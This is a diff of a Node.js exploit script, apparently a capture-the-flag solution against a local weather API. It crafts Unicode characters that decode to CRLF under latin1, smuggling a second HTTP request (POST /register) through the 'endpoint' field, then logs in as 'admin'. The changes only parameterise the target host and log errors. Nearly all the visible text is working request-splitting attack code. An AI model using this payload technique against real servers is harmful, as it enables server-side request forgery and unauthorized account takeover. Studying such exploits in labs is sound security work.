@@ -1,5 +1,7 @@
 var request = require('request');
 
+var target = "127.0.0.1:8080"
+
 var header = "127.0.0.1/\u{0120}HTTP/1.1\
 \u{010D}\u{010A}\u{010D}\u{010A}\
 POST\u{0120}http://127.0.0.1/register\u{0120}HTTP/1.1\
@@ -21,7 +23,7 @@ var endpoint_str = Buffer.from(exploit_str, 'latin1').toString()
 console.log(endpoint_str)
 
 var options = {
-  uri: 'http://127.0.0.1:8080/api/weather',
+  uri: `http://${target}/api/weather`,
   method: 'POST',
   json: {
     "endpoint": exploit_str,
@@ -34,12 +36,12 @@ request(options, function (error, response, body) {
   if (!error && response.statusCode == 200) {
     console.log(body)
   }else{
-    console.log("oop");
+    console.log(error);
   }
 });
 
 options = {
-  uri: 'http://127.0.0.1:8080/login',
+  uri: `http://${target}/login`,
   method: 'POST',
   json: {
     "username": "admin",
@@ -51,6 +53,6 @@ request(options, function (error, response, body) {
   if (!error && response.statusCode == 200) {
     console.log(body)
   }else{
-    console.log("oop");
+    console.log(error);
   }
 });
